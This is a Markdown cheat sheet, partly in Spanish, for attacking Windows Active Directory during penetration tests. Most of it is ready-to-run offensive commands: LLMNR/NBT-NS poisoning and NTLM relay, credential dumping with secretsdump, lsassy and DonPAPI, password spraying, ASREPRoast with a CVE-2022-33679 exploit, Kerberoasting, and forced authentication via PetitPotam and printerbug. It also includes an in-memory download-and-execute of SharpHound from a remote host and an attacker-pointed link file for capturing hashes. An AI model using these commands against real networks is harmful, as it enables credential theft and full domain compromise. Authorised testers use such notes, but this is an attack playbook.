# Enumeracion de Active Directory

Inspired by [Orange Cyberdefense](https://orange-cyberdefense.github.io/ocd-mindmaps/):
and [Mayfly](https://mayfly277.github.io/categories/ad/)

![Mindmap Pentest AD](/Images/image-1.png)

## Reconocimiento

### Enumerar AD

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.alux.cc
```

### Enumerate the trusts

```bash
ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP trusts
```

### Enumerar SMBs

```bash
crackmapexec smb <ip_range>
```

## Enumeracion de Usuarios

## Possible Users

```bash
# Tool https://gist.github.com/superkojiman/11076951
python3 namemash.py >> usernames.txt
```

### Null session

```bash
rpcclient -U "" -N $ip
crackmapexec smb $ip --users
net rpc group members 'Domain Users' -W 'alux.cc' -I $ip -u '%'
enum4linux -U $ip | grep 'user:'
```

### OSINT | Username Anarchy | Kerbrute (Pendiente)

[username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```bash
kerbrute userenum -d alux.cc usernames.txt
```

## Poisoning and Relay

### Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD

#### Linux

[mitm6](https://github.com/dirkjanm/mitm6)
[Responder](https://github.com/lgandx/Responder)

```bash
sudo responder -I tun0
mitm6 
```
#### Windows

[Inveigh](https://github.com/Kevin-Robertson/Inveigh)

```powershell
.\Inveigh.exe
```

### Relay Attacks

>Note that the relayed authentication must be from a user which has Local Admin access to the relayed host and SMB signing must be disabled.

#### Enumerate Unsigned SMB

> signing:False

```bash
crackmapexec smb scope.txt --gen-relay-list relay.txt
```

Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.

```bash
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
#Revert process
sed -i 's/HTTP = Off/HTTP = On/g' /etc/responder/Responder.conf && cat /etc/responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = Off/SMB = On/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
```

Start ntlmrelay

- `-tf` : list of targets to relay the authentication
- `-of` : output file, this will keep the captured smb hashes just like we did before with responder, to crack them later
- `-smb2support` : support for smb2
- `-socks` : will start a socks proxy to use relayed authentication

```bash
#Install proxychains
sudo apt install proxychains
#Configure /etc/proxychains.conf and add this line
socks4  127.0.0.1 1080
# Start attack
sudo python3 ntlmrelayx.py -tf relay.txt -of netntlm -smb2support -socks
# User obtained
# [*] SMBD-Thread-97: Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left!
proxychains python3 secretsdump.py -no-pass 'DOMAIN'/'USER'@'IP'
proxychains lsassy --no-pass -d DOMAIN -u userobtained $ip
proxychains DonPAPI -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -credz creds_robb.txt
proxychains crackmapexec smb $ip -d DOMAINnotdotcom -u username -p password --sam #password could be anything
proxychains python3 smbclient.py -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -debug
proxychains python3 smbexec.py -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -debug
```

#### Mitm6 + ntlmrelayx to ldap (Pendiente)


#### Coerced auth smb + ntlmrelayx to ldaps with drop the mic (Pendiente)

## Valid Username

### Password Spraying

```bash
crackmapexec smb -u usernames.txt -p Password123!
kerbrute passwordspray --user-as-pass --dc $ip -d alux.cc users.txt
use auxiliary/scanner/smb/smb_login
crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce
```

### ASREPRoast

#### Linux

```bash
impacket-GetNPUsers domain.com/ -request -format hashcat -dc-ip $ip -usersfile users.txt
```
#### Windows

```powershell
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```

#### ASREPRoast + CVE-2022-33679

[CVE-2022-33679](https://github.com/Bdenneu/CVE-2022-33679)

```bash
python3 CVE-2022-33679.py domain.com/user <SERVER NAME>
```


## Valid Credentials

### Bloodhound

#### Linux

```bash
bloodhound-python -c All -u user -p 'password' -d domain.com --zip -ns dcIp
certipy find -u user@domain.com -p 'password' -dc-ip DCIP -bloodhound
```
> Si da error con `-c All` lo mejor sera usar solo DCOnly

and import this to [bloodhound ly4k version](https://github.com/ly4k/BloodHound)

```bash
./BloodHound  --no-sandbox --disable-dev-shm-usage
```

#### Windows

[SharpHound](https://github.com/BloodHoundAD/SharpHound)

```powershell
.\sharphound.exe -c All -d domain.com
## Memory Execution
$data = (New-Object System.Net.WebClient).DownloadData('http://ip/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("-d domain.com -c all".Split())
```

### Kerberoasting

```bash
GetUserSPNs.py -request -dc-ip <DCIP> domain.com/username -outputfile hashes.kerberoast
GetUserSPNs.py -request -dc-ip <DCIP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
crackmapexec ldap $ip -u username -p 'password' -d domain.com --kerberoasting KERBEROASTING
```

### ADCS

```bash
certipy find -u user@domain.com -p 'pass' -vulnerable -dc-ip DCIP -stdout > certipy_output.txt
```

### Enum shares

```bash
crackmapexec smb smb.txt -u 'user' -p 'pass' --shares
## Listar smb y archivos
smbmap -r -d 'domain.com' -u 'username' -p 'password' -H ip --depth (default 5) --no-write-check
smbmap -r -d 'domain.com' -u 'username' -p 'password' --host-file listIPs
# Search interesting files inside PC (need access to smb to compoter)
sudo python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
sudo python3 ./scavenger.py smb -t smb.txt -u administrator -p Password123 -d test.local
```

#### Create link 

```bash
crackmapexec smb $ip -u username -p 'pass' -d domain.com -M slinky -o NAME=.thumbs.db SERVER=attackerIP
# Clean up
crackmapexec smb $ip -u username -p 'pass; -d domain.com -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true
```

### Enum MachineAccountQuota 

```bash
crackmapexec ldap ip -u username -p password -d domain.com -M MAQ
```

### Enum dns

[dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
[adidnsdump](https://github.com/dirkjanm/adidnsdump)
```bash
python3 dnstool.py -u 'domain.com\username' -p 'password' --record '*' --action query DCIP
adidnsdump -u 'domain.com\username' -p 'password' pc.domain.com
```

### Coerce

> Iniciar listener antes 

[Coercer.py](https://github.com/p0dalirius/Coercer)
[PetitPotam.py](https://github.com/topotam/PetitPotam)
[printerbug.py](https://github.com/dirkjanm/krbrelayx/)

```bash
python3 rpcdump.py domain.com/username:Password@target | grep MS-RPRN
#Protocol: [MS-RPRN]: Print System Remote Protocol 
python3 printerbug.py domain.com/username:'Password'@targetIP listenerIP
#Authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions
python3 PetitPotam.py -u 'username' -p 'password' -d 'domain.com' listenerIP targetIP
#Automatically coerce a Windows server to authenticate on an arbitrary machine through many methods
python3 Coercer.py coerce -u 'username' -p 'password' -d 'domain.com' -t targetIP -l listenerIP --always-continue
```

